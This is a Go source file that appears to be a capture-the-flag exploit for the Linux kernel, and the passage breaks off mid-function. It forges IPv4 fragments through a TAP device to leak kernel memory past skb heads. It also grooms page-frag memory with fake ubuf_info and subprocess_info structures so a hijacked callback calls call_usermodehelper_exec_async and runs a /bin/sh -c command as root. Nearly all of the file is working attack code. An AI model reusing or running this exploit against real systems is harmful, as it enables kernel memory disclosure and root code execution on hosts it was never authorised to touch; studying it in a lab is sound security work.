package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	iffTap       = 0x0002
	iffNoPI      = 0x1000
	iffVnetHdr   = 0x4000
	tunSetIFF    = 0x400454ca
	tunSetSndBuf = 0x400454d4
	needsCsum    = 1

	ethLen     = 14
	vlanLen    = 4
	ipLen      = 20
	l2Len      = ethLen + vlanLen + vlanLen
	csumAtIP   = l2Len
	vlanProto  = 0x8100
	ipProtoEth = 0x0800

	fragPayload = 8
	restPayload = 400
	marker      = 0xa5
	ipID        = 0x9999
)

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "run as root")
		os.Exit(1)
	}
	cfg := parseCfg()
	if err := run(cfg); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

type cfg struct {
	head          int
	rest          int
	tebar         int
	tebarFill     byte
	capture       time.Duration
	count         int
	page          bool
	skipVerify    bool
	egress        bool
	egressRest    int
	iface         string
	dst           string
	src           string
	gateway       string
	dstMAC        string
	egressWait    time.Duration
	egressSpray   int
	egressFill    byte
	sprayDelay    time.Duration
	vlanTags      int
	answerDstARP  bool
	transport     string
	udpSrcPort    int
	udpPort       int
	tcpSrcPort    int
	tcpPort       int
	tcpValid      bool
	tcpEcho       bool
	staleOptions  bool
	staleOptSkip  int
	staleOptLen   int
	staleGroom    bool
	staleGrooms   int
	staleDelay    time.Duration
	staleEach     time.Duration
	staleHold     bool
	staleHead     uint64
	staleFragPage uint64
	staleFragFile string
	staleSKB      uint64
	staleDev      uint64
	staleHeadFile string
	staleCallback uint64
	staleCopyLen  int
	staleExec     uint64
	staleNoop     uint64
	staleCommand  string
	csumOffset    int
	csumWord      uint
}

func parseCfg() cfg {
	c := cfg{}
	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
	flag.IntVar(&c.vlanTags, "vlan-tags", 2, "number of nested VID-0 tags before IPv4 (at least 2)")
	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
	flag.IntVar(&c.tebar, "tebar", 0, "128-byte immediately-freed TAP frames written before the head skb")
	fill := flag.Int("tebar-fill", 0xee, "payload byte stored in tebar frames")
	captureMs := flag.Int("capture-ms", 800, "time to collect output fragments")
	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
	flag.BoolVar(&c.egress, "egress", false, "send the fragment sequence through a real virtio-net interface")
	flag.IntVar(&c.egressRest, "egress-rest", 4000, "payload after the short head in egress mode")
	flag.StringVar(&c.iface, "iface", "eth0", "egress interface")
	flag.StringVar(&c.dst, "dst", "chall.itsbengsky.id", "egress IPv4 destination or hostname")
	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
	flag.IntVar(&c.egressSpray, "egress-spray", 0, "128-byte immediately-freed host-TAP frames sent before each malicious head")
	egressFill := flag.Int("egress-spray-fill", 0xee, "payload byte stored in egress spray frames")
	sprayDelayUS := flag.Int("spray-delay-us", 1000, "delay after predecessor frames, allowing them to be freed before the malicious head")
	flag.BoolVar(&c.answerDstARP, "answer-dst-arp", false, "answer ARP for -dst so host-routed fragments hairpin back to this interface")
	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp, tcp, or raw253")
	flag.IntVar(&c.udpSrcPort, "udp-source-port", 0x0101, "UDP source port (also the first two post-mutation IPv4 option bytes)")
	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
	flag.IntVar(&c.tcpSrcPort, "tcp-source-port", 0x0100, "TCP source port (default bytes become NOP,END IPv4 options after mutation)")
	flag.IntVar(&c.tcpPort, "tcp-port", 443, "destination port used by the TCP carrier")
	flag.BoolVar(&c.tcpValid, "tcp-valid-checksum", false, "choose payload length and dual TCP checksums so TCP is valid before and after mutation")
	flag.BoolVar(&c.tcpEcho, "tcp-echo-options", false, "encode a valid Timestamp option and recognize a TCP peer echoing the disclosed option bytes")
	flag.BoolVar(&c.staleOptions, "stale-options-write", false, "lab-only: shrink a parsed 60-byte IPv4 header and exercise stale option processing on short frag_list children")
	flag.IntVar(&c.staleOptSkip, "stale-option-skip", 0, "lab-only: copied option bytes before the stale non-copied option (0 or 2..6)")
	flag.IntVar(&c.staleOptLen, "stale-option-len", 40, "lab-only: bytes changed to IPOPT_NOOP by the stale option")
	flag.BoolVar(&c.staleGroom, "stale-page-groom", false, "lab-only: seed one page-frag chunk with a 0x6b marker before the short child (exploratory)")
	flag.IntVar(&c.staleGrooms, "stale-groom-count", 1, "lab-only: number of 3840-byte marker allocations before the short child")
	staleDelayMs := flag.Int("stale-groom-delay-ms", 50, "lab-only: delay after marker allocations")
	staleEachUS := flag.Int("stale-groom-each-delay-us", 0, "lab-only: delay after each marker allocation")
	flag.BoolVar(&c.staleHold, "stale-groom-hold", true, "lab-only: hold marker SKBs in a TAP packet-socket queue until all chunks are allocated")
	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
	flag.Uint64Var(&c.staleFragPage, "stale-groom-frag-page", 0, "lab-only: seed frags[0] with an observed struct page pointer")
	flag.StringVar(&c.staleFragFile, "stale-groom-frag-page-file", "", "lab-only: two-stage mode; wait for an observed task_frag struct page pointer")
	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
	flag.Uint64Var(&c.staleCallback, "stale-groom-callback", 0, "lab-only: fake ubuf_info completion callback address")
	flag.IntVar(&c.staleCopyLen, "stale-copy-len", 0, "lab-only: terminate fake ubuf_info after this many non-NUL bytes for a strcpy callback")
	flag.Uint64Var(&c.staleExec, "stale-groom-umh-async", 0, "lab-only: call_usermodehelper_exec_async address used after a strcpy callback")
	flag.Uint64Var(&c.staleNoop, "stale-groom-noop-ret", 0, "lab-only: zero-returning callback used by the fake subprocess_info")
	flag.StringVar(&c.staleCommand, "stale-groom-command", "echo BENGSKY_RCE_OK >/tmp/bengsky-rce", "lab-only: /bin/sh -c command for the fake subprocess_info")
	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
	flag.Parse()
	c.tebarFill = byte(*fill)
	c.egressFill = byte(*egressFill)
	c.sprayDelay = time.Duration(*sprayDelayUS) * time.Microsecond
	c.capture = time.Duration(*captureMs) * time.Millisecond
	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
		os.Exit(1)
	}
	if c.vlanTags < 2 || c.vlanTags > 128 {
		fmt.Fprintln(os.Stderr, "-vlan-tags must be in 2..128")
		os.Exit(1)
	}
	if c.rest < 16 {
		fmt.Fprintln(os.Stderr, "-rest must be at least 16")
		os.Exit(1)
	}
	if c.capture <= 0 {
		fmt.Fprintln(os.Stderr, "-capture-ms must be positive")
		os.Exit(1)
	}
	if c.count <= 0 {
		fmt.Fprintln(os.Stderr, "-count must be positive")
		os.Exit(1)
	}
	if c.egress && c.count > 65536 {
		fmt.Fprintln(os.Stderr, "egress -count must not exceed 65536 unique IPv4 IDs")
		os.Exit(1)
	}
	if c.egressSpray < 0 || c.egressSpray > 4096 {
		fmt.Fprintln(os.Stderr, "-egress-spray must be in 0..4096")
		os.Exit(1)
	}
	if *sprayDelayUS < 0 || *sprayDelayUS > 1000000 {
		fmt.Fprintln(os.Stderr, "-spray-delay-us must be in 0..1000000")
		os.Exit(1)
	}
	if c.egressRest < 64 || c.head+c.egressRest > 65515 {
		fmt.Fprintln(os.Stderr, "-egress-rest must produce an IPv4 datagram of 84..65535 bytes")
		os.Exit(1)
	}
	if c.egressWait <= 0 {
		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
		os.Exit(1)
	}
	if c.transport != "udp" && c.transport != "tcp" && c.transport != "raw253" {
		fmt.Fprintln(os.Stderr, "-egress-transport must be udp, tcp, or raw253")
		os.Exit(1)
	}
	if (c.transport == "udp" || c.transport == "tcp") && c.head != 8 {
		fmt.Fprintln(os.Stderr, "UDP and TCP egress transports require -head 8")
		os.Exit(1)
	}
	if c.udpSrcPort < 1 || c.udpSrcPort > 65535 || c.udpPort < 1 || c.udpPort > 65535 {
		fmt.Fprintln(os.Stderr, "-udp-source-port and -udp-port must be in 1..65535")
		os.Exit(1)
	}
	if c.tcpSrcPort < 1 || c.tcpSrcPort > 65535 || c.tcpPort < 1 || c.tcpPort > 65535 {
		fmt.Fprintln(os.Stderr, "-tcp-source-port and -tcp-port must be in 1..65535")
		os.Exit(1)
	}
	if c.tcpValid && (!c.egress || c.transport != "tcp") {
		fmt.Fprintln(os.Stderr, "-tcp-valid-checksum requires -egress -egress-transport tcp")
		os.Exit(1)
	}
	if c.tcpEcho && !c.tcpValid {
		fmt.Fprintln(os.Stderr, "-tcp-echo-options requires -tcp-valid-checksum")
		os.Exit(1)
	}
	if c.staleOptions && c.egress {
		fmt.Fprintln(os.Stderr, "-stale-options-write is available only in the prepared TAP lab")
		os.Exit(1)
	}
	if c.staleOptions && c.staleOptSkip != 0 && (c.staleOptSkip < 2 || c.staleOptSkip > 6) {
		fmt.Fprintln(os.Stderr, "-stale-option-skip must be 0 or in 2..6")
		os.Exit(1)
	}
	if c.staleOptions && (c.staleOptLen < 2 || c.staleOptSkip+c.staleOptLen > 40) {
		fmt.Fprintln(os.Stderr, "-stale-option-len must be at least 2 and keep skip+len within 40")
		os.Exit(1)
	}
	if c.staleGroom && (!c.staleOptions || !c.page) {
		fmt.Fprintln(os.Stderr, "-stale-page-groom requires -stale-options-write -page")
		os.Exit(1)
	}
	if c.staleGrooms < 1 || c.staleGrooms > 256 || c.staleDelay < 0 || c.staleDelay > 10*time.Second || c.staleEach < 0 || c.staleEach > time.Second {
		fmt.Fprintln(os.Stderr, "stale groom count must be 1..256, final delay 0..10000 ms, and per-groom delay 0..1000000 us")
		os.Exit(1)
	}
	if c.staleHeadFile != "" && c.staleHead != 0 {
		fmt.Fprintln(os.Stderr, "use either -stale-groom-head or -stale-groom-head-file")
		os.Exit(1)
	}
	if (c.staleHead != 0 || c.staleHeadFile != "") != (c.staleCallback != 0) || ((c.staleHead != 0 || c.staleHeadFile != "") && !c.staleGroom) {
		fmt.Fprintln(os.Stderr, "stale groom head/head-file and callback must be supplied together and require -stale-page-groom")
		os.Exit(1)
	}
	if c.staleFragPage != 0 && c.staleFragFile != "" {
		fmt.Fprintln(os.Stderr, "use either -stale-groom-frag-page or -stale-groom-frag-page-file")
		os.Exit(1)
	}
	if (c.staleFragPage != 0 || c.staleFragFile != "") && (!c.staleGroom || c.staleHead != 0 || c.staleHeadFile != "" || c.staleCallback != 0) {
		fmt.Fprintln(os.Stderr, "stale fragment-page grooming requires -stale-page-groom and cannot be combined with callback grooming")
		os.Exit(1)
	}
	if c.staleFragPage&63 != 0 {
		fmt.Fprintln(os.Stderr, "-stale-groom-frag-page must be a 64-byte-aligned struct page pointer")
		os.Exit(1)
	}
	if c.staleCopyLen < 0 || c.staleCopyLen > 80 || (c.staleCopyLen != 0 && c.staleCallback == 0) {
		fmt.Fprintln(os.Stderr, "-stale-copy-len must be in 0..80 and requires stale groom head/head-file plus callback")
		os.Exit(1)
	}
	if c.staleExec != 0 && ((c.staleHead == 0 && c.staleHeadFile == "") || c.staleCallback == 0 || c.staleNoop == 0) {
		fmt.Fprintln(os.Stderr, "-stale-groom-umh-async requires stale groom head/head-file, callback, and noop-ret addresses")
		os.Exit(1)
	}
	if c.transport == "tcp" && ((!c.egress && c.head+c.rest < 60) || (c.egress && c.head+c.egressRest < 60)) {
		fmt.Fprintln(os.Stderr, "TCP egress transport requires at least 60 bytes of IPv4 payload")
		os.Exit(1)
	}
	maxCsumOffset := ipLen + c.head - 2
	if c.csumOffset < 0 || c.csumOffset > maxCsumOffset {
		fmt.Fprintf(os.Stderr, "-csum-offset must be in 0..%d for -head %d\n", maxCsumOffset, c.head)
		os.Exit(1)
	}
	if c.csumWord > 0xffff {
		fmt.Fprintln(os.Stderr, "-csum-word must fit in 16 bits")
		os.Exit(1)
	}
	if c.csumWord == 0xffff {
		fmt.Fprintln(os.Stderr, "-csum-word 0xffff is not attainable for a nonempty checksum input")
		os.Exit(1)
	}
	if c.egress && (c.csumOffset != 0 || c.csumWord != 0x004f) {
		fmt.Fprintln(os.Stderr, "egress mode currently requires the verified -csum-offset 0 -csum-word 0x004f geometry")
		os.Exit(1)
	}
	return c
}

func run(c cfg) error {
	if c.egress {
		return runEgress(c)
	}
	tapName := getenv("PWN_TAP", "bengskytap")
	capName := getenv("PWN_CAP", "bengskyv1")
	if _, err := net.InterfaceByName(tapName); err != nil {
		return fmt.Errorf("tap %s is not present: %w", tapName, err)
	}
	if _, err := net.InterfaceByName(capName); err != nil {
		return fmt.Errorf("capture iface %s is missing: %w", capName, err)
	}
	tap, err := openTap(tapName, c.page)
	if err != nil {
		return fmt.Errorf("attach %s: %w", tapName, err)
	}
	defer tap.Close()

	cap, err := listen(capName)
	if err != nil {
		return err
	}
	defer cap.Close()
	if c.staleOptions {
		return runStaleOptionsWrite(tap, cap, c)
	}

	if !c.skipVerify {
		if err := verifyWrite(tap, cap, c); err != nil {
			return err
		}
	}
	seen := make(map[string][]byte)
	verbose := c.count == 1
	for i := 0; i < c.count; i++ {
		leaks, err := bali(tap, cap, c, verbose)
		if err != nil {
			return err
		}
		for _, leak := range leaks {
			seen[string(leak)] = leak
		}
	}
	if !verbose {
		keys := make([]string, 0, len(seen))
		for key := range seen {
			keys = append(keys, key)
		}
		sort.Strings(keys)
		for _, key := range keys {
			leak := seen[key]
			fmt.Printf("past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
		}
	}
	return nil
}

func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	if c.staleFragFile != "" {
		probe := c
		probe.staleOptLen = 14
		probe.staleFragPage = 0
		if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
			return fmt.Errorf("stale fragment-page probe stage: %w", err)
		}
		fmt.Printf("stale-options: fragment-page probe ready; write the observed task_frag struct page to %s\n", c.staleFragFile)
		addresses, err := waitForKernelAddresses(c.staleFragFile, 30*time.Second)
		if err != nil {
			return err
		}
		attack := c
		attack.staleFragPage = addresses[0]
		attack.staleFragFile = ""
		attack.staleGrooms = 8
		fmt.Printf("stale-options: fragment-page stage page=%#x option_len=%d groom_count=%d\n",
			attack.staleFragPage, attack.staleOptLen, attack.staleGrooms)
		return runStaleOptionsAttempt(tap, cap, attack)
	}
	if c.staleHeadFile == "" {
		return runStaleOptionsAttempt(tap, cap, c)
	}

	probe := c
	probe.staleOptLen = 14
	probe.staleHead = 0
	probe.staleCallback = 0
	if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
		return fmt.Errorf("stale-options probe stage: %w", err)
	}
	fmt.Printf("stale-options: probe ready; write the observed victim head to %s\n", c.staleHeadFile)
	addresses, err := waitForKernelAddresses(c.staleHeadFile, 30*time.Second)
	if err != nil {
		return err
	}
	attack := c
	attack.staleHead = addresses[0]
	if len(addresses) >= 3 {
		attack.staleSKB = addresses[1]
		attack.staleDev = addresses[2]
	}
	attack.staleHeadFile = ""
	// The probe leaves its victim page cached in this task_frag. Eight
	// 3840-byte held grooms seed that same page without advancing to another.
	attack.staleGrooms = 8
	fmt.Printf("stale-options: callback stage head=%#x skb=%#x dev=%#x callback=%#x groom_count=%d\n",
		attack.staleHead, attack.staleSKB, attack.staleDev, attack.staleCallback, attack.staleGrooms)
	return runStaleOptionsAttempt(tap, cap, attack)
}

func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		data, err := os.ReadFile(path)
		if err == nil && strings.TrimSpace(string(data)) != "" {
			fields := strings.Fields(string(data))
			values := make([]uint64, 0, len(fields))
			for _, field := range fields {
				value, parseErr := strconv.ParseUint(field, 0, 64)
				if parseErr != nil {
					return nil, fmt.Errorf("parse victim addresses from %s: %w", path, parseErr)
				}
				values = append(values, value)
			}
			return values, nil
		}
		if err != nil && !errors.Is(err, os.ErrNotExist) {
			return nil, fmt.Errorf("read victim head from %s: %w", path, err)
		}
		time.Sleep(20 * time.Millisecond)
	}
	return nil, fmt.Errorf("timed out waiting for victim head in %s", path)
}

func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
	if c.staleGroom {
		var hold *capture
		if c.staleHold {
			var err error
			hold, err = listen(getenv("PWN_TAP", "bengskytap"))
			if err != nil {
				return fmt.Errorf("stale-options: open groom hold socket: %w", err)
			}
			if err := syscall.SetsockoptInt(hold.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4<<20); err != nil {
				hold.Close()
				return fmt.Errorf("stale-options: grow groom hold queue: %w", err)
			}
		}
		for i := 0; i < c.staleGrooms; i++ {
			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleFragPage, c.staleSKB, c.staleDev, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
			if err != nil {
				if hold != nil {
					hold.Close()
				}
				return fmt.Errorf("stale-options: build page groom %d/%d: %w", i+1, c.staleGrooms, err)
			}
			if err := writeTap(tap, frame, false, 0, 0); err != nil {
				if hold != nil {
					hold.Close()
				}
				return fmt.Errorf("stale-options: page groom %d/%d: %w", i+1, c.staleGrooms, err)
			}
			if c.staleEach > 0 {
				time.Sleep(c.staleEach)
			}
		}
		if hold != nil {
			if err := hold.drainCount(c.staleGrooms, 2*time.Second); err != nil {
				hold.Close()
				return fmt.Errorf("stale-options: drain groom hold queue: %w", err)
			}
			hold.Close()
		}
		// The output capture socket also sees the marker frames. Drain it so
		// those queued clones release their page references before the short
		// fragment asks task_frag to recycle the just-seeded compound page.
		cap.drain(c.staleDelay)
	}
	const desired = uint16(0x0045) // network bytes 45 00: shrink IHL 15 to IHL 5
	id := uint16(ipID)
	headPayload := bytesRepeat(8, 0x31)
	shortPayload := bytesRepeat(8, 0x42)
	optionAt := c.staleOptSkip
	if optionAt > 0 {
		shortPayload[0] = 0x80 // copied unknown option: advance without memset
		shortPayload[1] = byte(optionAt)
	}
	shortPayload[optionAt] = 0x44 // non-copied Timestamp option
	shortPayload[optionAt+1] = byte(c.staleOptLen)
	if end := optionAt + c.staleOptLen; end < len(shortPayload) {
		shortPayload[end] = 0 // stop before interpreting filler as another option
	}
	finalPayload := bytesRepeat(128, 0x53)
	allPayload := append(append(append([]byte(nil), headPayload...), shortPayload...), finalPayload...)
	options := bytesRepeat(40, byte(1))
	whole := ipv4PacketWithOptions(0, false, allPayload, id, options)
	forwardTTL(whole)
	adjust := len(whole) - len(finalPayload) + 32
	if !solvePacketChecksumAt(whole, adjust, desired) {
		return fmt.Errorf("stale-options: cannot solve deferred checksum word 0x%04x", desired)
	}
	copy(finalPayload[32:34], whole[adjust:adjust+2])

	frames := [][]byte{
		frameWithVLAN(ipv4PacketWithOptions(8, true, shortPayload, id, nil), c.vlanTags),
		frameWithVLAN(ipv4PacketWithOptions(16, false, finalPayload, id, nil), c.vlanTags),
	}
	for _, f := range frames {
		if err := writeTap(tap, f, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
			return err
		}
	}
	head := frameWithVLAN(ipv4PacketWithOptions(0, true, headPayload, id, options), c.vlanTags)
	if err := writeTap(tap, head, true, uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
		return err
	}

	pkts := cap.collect(c.capture, id)
	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t\n",
		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold)
	for i, ip := range pkts {
		if len(ip) < ipLen {
			continue
		}
		ihl := int(ip[0]&0x0f) * 4
		off := int(binary.BigEndian.Uint16(ip[6:])&0x1fff) * 8
		payloadEnd := min(len(ip), int(binary.BigEndian.Uint16(ip[2:])))
		payload := []byte(nil)
		if ihl <= payloadEnd {
			payload = ip[ihl:payloadEnd]
		}
		fmt.Printf("  frag=%d ihl=%d offset=%d payload_len=%d payload_prefix=%s\n",
			i, ihl, off, len(payload), hex.EncodeToString(payload[:min(16, len(payload))]))
	}
	if len(pkts) == 0 {
		return errors.New("stale-options: no output fragments captured")
	}
	return nil
}

func stalePageGroomFrame(fill byte, victimHead, fragPage, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
	// 3456 is the largest convenient frame that still passes tun_can_build_skb's
	// PAGE_SIZE eligibility check, which includes TUN_RX_PAD, XDP headroom, and
	// skb_shared_info. With no XDP program the actual task_frag chunk is 3840
	// bytes, so eight chunks fit in a 32768-byte high-order page and the ninth
	// starts at offset zero in a fresh page.
	frame := bytesRepeat(3456, fill)
	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
	if fragPage != 0 {
		// The predecessor starts at victim head+64.  A reclaimed short
		// child's skb_shared_info begins at head+128 and frags[0] begins
		// another 48 bytes later, so frame+112 seeds the 16-byte skb_frag_t.
		// Keep destructor_arg (frame+104) zero: a stale write may set the
		// zerocopy-enable flag, but skb_zcopy() then returns NULL and release
		// continues to the nr_frags loop without making a callback.
		for i := 104; i < 112; i++ {
			frame[i] = 0
		}
		binary.LittleEndian.PutUint64(frame[112:120], fragPage)
		binary.LittleEndian.PutUint32(frame[120:124], 1) // skb_frag_t.len
		binary.LittleEndian.PutUint32(frame[124:128], 0) // skb_frag_t.offset
	}
	if victimHead != 0 {
		// The reclaimed short child has end=128. skb_shared_info starts
		// there, destructor_arg is at +40, and frags[] starts at +48.
		// Predecessor bytes start at head+64, so frame offsets 104, 120,
		// and 144 seed destructor_arg, a fake ubuf_info, and fake ops.
		const fakeUarg = 184
		fakeOps := uint64(208)
		if execAsync != 0 {
			if callback == 0 || noopRet == 0 {
				return nil, errors.New("fake subprocess_info requires callback and noop-ret addresses")
			}
			// fakeUarg is also the strcpy source. Put fake ops at source+80:
			// this avoids NUL bytes in its page-relative address and makes the
			// callback pointer overlap the unused cleanup field of the fake
			// subprocess_info. The overwritten skb destructor at source+96
			// invokes call_usermodehelper_exec_async(skb). Copy through skb->len
			// at offset 112 so ____dev_forward_skb rejects and frees the skb
			// immediately, before the receive path reuses skb->cb (which holds
			// subprocess_info.path/argv/envp in the copied prefix).
			fakeOps = fakeUarg + 80
			copyLen = 116
		}
		if copyLen != 0 && execAsync == 0 {
			// Offset 0x111 avoids NUL bytes in the little-endian pointer
			// when victimHead is page aligned. This lets strcpy copy a
			// selected non-NUL span from fakeUarg.
			fakeOps = 0x111
		}
		binary.LittleEndian.PutUint64(frame[104:112], victimHead+fakeUarg)
		binary.LittleEndian.PutUint64(frame[120:128], victimHead+fakeOps)
		if copyLen != 0 {
			for i := 8; i < copyLen; i++ {
				frame[120+i] = fill
			}
			frame[120+copyLen] = 0
		} else {
			binary.LittleEndian.PutUint32(frame[128:132], 1)
			frame[132] = 0
		}
		opsAt := int(fakeOps) - 64
		binary.LittleEndian.PutUint64(frame[opsAt:opsAt+8], callback)
		binary.LittleEndian.PutUint64(frame[opsAt+8:opsAt+16], 0)
		if execAsync != 0 {
			const (
				pathOff     = 0x511
				dashCOff    = 0x531
				cmdOff      = 0x551
				argvOff     = 0x711
				envpOff     = 0x791
				completeOff = 0x820
				fakeDevOff  = 0x911
				fakeCTOff   = 0xb10
			)
			uargAt := fakeUarg - 64
			put64 := func(sourceOff int, value uint64) {
				binary.LittleEndian.PutUint64(frame[uargAt+sourceOff:uargAt+sourceOff+8], value)
			}
			putHead := func(headOff int, value []byte) {
				copy(frame[headOff-64:], value)
			}
			put64(0, victimHead+fakeOps)
			put64(8, victimHead+0x311)
			// strcpy replaces skb->dev at destination offset 16. A real,
			// aligned net_device pointer contains NUL bytes and cannot appear
			// inside the source string, so point it at controlled page data.
			// dev_net() only reads nd_net for a pointer comparison, and
			// eth_type_trans() replaces skb->dev with the real receiving device
			// immediately afterwards. The all-fill fake object intentionally
			// makes the comparison request the cross-netns scrub path.
			put64(16, victimHead+fakeDevOff)
			put64(24, victimHead+0x331)
			put64(32, victimHead+completeOff)
			put64(40, victimHead+pathOff)
			put64(48, victimHead+argvOff)
			put64(56, victimHead+envpOff)
			binary.LittleEndian.PutUint32(frame[uargAt+64:uargAt+68], 0x02020202)
			put64(72, noopRet)
			put64(80, callback)
			put64(88, victimHead+cmdOff)
			put64(96, execAsync)
			// skb_release_head_state runs nf_reset_ct after the destructor.
			// The prefix must therefore carry a non-NUL, safely refcounted
			// _nfct value. Low three bits are flags and are masked before the
			// controlled nf_conntrack.use field is decremented.
			put64(104, victimHead+fakeCTOff+1)
			binary.LittleEndian.PutUint32(frame[uargAt+112:uargAt+116], 0x7f7f7f7f)
			frame[uargAt+copyLen] = 0
			if nulAt := bytes.IndexByte(frame[uargAt:uargAt+copyLen], 0); nulAt >= 0 {
				return nil, fmt.Errorf("fake subprocess_info contains a NUL at byte %d before terminator %d for head %#x", nulAt, copyLen, victimHead)
			}

			putHead(pathOff, append([]byte("/bin/sh"), 0))
			putHead(dashCOff, []byte{'-', 'c', 0})
			putHead(cmdOff, append([]byte(command), 0))
			argvAt := argvOff - 64
			binary.LittleEndian.PutUint64(frame[argvAt:argvAt+8], victimHead+pathOff)
			binary.LittleEndian.PutUint64(frame[argvAt+8:argvAt+16], victimHead+dashCOff)
			binary.LittleEndian.PutUint64(frame[argvAt+16:argvAt+24], victimHead+cmdOff)
			binary.LittleEndian.PutUint64(frame[argvAt+24:argvAt+32], 0)
			binary.LittleEndian.PutUint64(frame[envpOff-64:envpOff-56], 0)
			completeAt := completeOff - 64
			// struct completion: done=0, unlocked swait head, empty list.
			for i := 0; i < 16; i++ {
				frame[completeAt+i] = 0
			}
			binary.LittleEndian.PutUint64(frame[completeAt+16:completeAt+24], victimHead+completeOff+16)
			binary.LittleEndian.PutUint64(frame[completeAt+24:completeAt+32], victimHead+completeOff+16)
			binary.LittleEndian.PutUint32(frame[fakeCTOff-64:fakeCTOff-60], 0x02020202)
		}
	}
	return frame, nil
}

func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
	if adjust < 0 || adjust+1 >= len(pkt) {
		return false
	}
	for w := 0; w < 65536; w++ {
		pkt[adjust] = byte(w)
		pkt[adjust+1] = byte(w >> 8)
		if csumFold(csumPartial(pkt)) == desired {
			return true
		}
	}
	return false
}

func ipv4PacketWithOptions(offset int, more bool, payload []byte, id uint16, options []byte) []byte {
	hlen := ipLen + len(options)
	pkt := make([]byte, hlen+len(payload))
	pkt[0] = 0x40 | byte(hlen/4)
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = ipProtoRaw
	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
	copy(pkt[ipLen:hlen], options)
	copy(pkt[hlen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:hlen]))
	return pkt
}

func verifyWrite(tap *os.File, cap *capture, c cfg) error {
	payload := bytesRepeat(300, 0x5a)
	if !testo(payload, 0x1111, c.csumOffset, uint16(c.csumWord)) {
		return fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
	}
	pkt := datagram(0x1111, payload)
	if err := writeTap(tap, frameWithVLAN(pkt, c.vlanTags), true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
		return err
	}
	got := cap.collect(500*time.Millisecond, observedID(c, 0x1111))
	if len(got) == 0 {
		return errors.New("verify: no fragment captured")
	}
	written := binary.LittleEndian.Uint16(got[0][c.csumOffset : c.csumOffset+2])
	preserve := fragmentPreserveMask(c.csumOffset)
	fmt.Printf("verify: csum_offset=%d wanted=0x%04x observed=0x%04x first=0x%02x ihl=%d hdr=%s\n",
		c.csumOffset, c.csumWord, written, got[0][0], got[0][0]&0x0f,
		hex.EncodeToString(got[0][:min(20, len(got[0]))]))
	if (written & preserve) != (uint16(c.csumWord) & preserve) {
